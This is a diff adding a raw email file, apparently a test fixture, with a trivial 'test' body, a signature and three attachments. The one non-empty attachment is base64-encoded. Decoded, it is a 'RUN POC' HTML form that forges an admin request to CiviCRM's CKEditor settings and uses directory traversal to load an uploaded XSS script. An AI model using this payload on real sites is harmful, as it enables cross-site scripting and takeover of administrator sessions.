@@ -1,0 +1,66 @@
+MIME-Version: 1.0
+Date: Tue, 27 Aug 2024 09:28:55 +1000
+Message-ID: <CAB5wLF-6rJpx4k4CsBUM9LPhaqehZYghtCZdzb_123456@mail.gmail.com>
+Subject: test txt attachment
+From: Sam Lee <sam.lee@example.org>
+To: samlee001@gmail.com
+Content-Type: multipart/mixed; boundary="0000000000000f1e9806209e7d06"
+
+--0000000000000f1e9806209e7d06
+Content-Type: multipart/alternative; boundary="0000000000000f1e9606209e7d04"
+
+--0000000000000f1e9606209e7d04
+Content-Type: text/plain; charset="UTF-8"
+
+test
+
+--
+Sam Lee
+
+
+Big Business
+
+He/Him/His
+[image: mobilePhone] +61 421 460 312 <+61+421+460+312>
+[image: website] https://example.org
+
+--0000000000000f1e9606209e7d04
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+--0000000000000f1e9606209e7d04--
+--0000000000000f1e9806209e7d06
+Content-Type: text/plain; charset="UTF-8"; name="2_load_xss.html.txt"
+Content-Disposition: attachment; filename="2_load_xss.html.txt"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_m0bmqmih2
+Content-ID: <f_m0bmqmih2>
+
+77u/PGh0bWw+DQo8Zm9ybSBlbmN0eXBlPSJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29k
+ZWQiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwOi8vbG9jYWxob3N0L3dwLWFkbWluL2FkbWlu
+LnBocD9wYWdlPUNpdmlDUk0mcT1jaXZpY3JtJTJGYWRtaW4lMkZja2VkaXRvciI+DQo8aW5wdXQg
+dHlwZT0idGV4dCIgdmFsdWU9Im1vb25vIiBuYW1lPSJjb25maWdfc2tpbiI+IDxicj4NCjxpbnB1
+dCB0eXBlPSJ0ZXh0IiB2YWx1ZT0iQ0tFRElUT1IuZWRpdG9yQ29uZmlnID0gZnVuY3Rpb24oIGNv
+bmZpZyApIHt9OyIgbmFtZT0iY29uZmlnIj4gPGJyPg0KPGlucHV0IHR5cGU9InRleHQiIHZhbHVl
+PSIiIG5hbWU9ImNvbmZpZ19leHRyYVBsdWdpbnMiPiA8YnI+DQo8aW5wdXQgdHlwZT0idGV4dCIg
+dmFsdWU9Ii4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvY2l2aWNybS9wZXJzaXN0L2NybS1ja2VkaXRv
+ci14c3MuanMiIG5hbWU9ImNvbmZpZ19jdXN0b21Db25maWciPiA8YnI+DQo8aW5wdXQgdHlwZT0i
+c3VibWl0IiB2YWx1ZT0iUlVOIFBPQyI+DQo8L2Zvcm0+DQo8L2h0bWw+
+--0000000000000f1e9806209e7d06
+Content-Type: application/msword; name="form_03.doc"
+Content-Disposition: attachment; filename="form_03.doc"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_m0bmqhqx1
+Content-ID: <f_m0bmqhqx1>
+
+
+--0000000000000f1e9806209e7d06
+Content-Type: application/pdf; name="2932_1 Ward Grouped Mayor-Lismore.pdf"
+Content-Disposition: attachment; filename="2932_1 Ward Grouped Mayor-Lismore.pdf"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_m0bmqhpv0
+Content-ID: <f_m0bmqhpv0>
+
+
+--0000000000000f1e9806209e7d06--
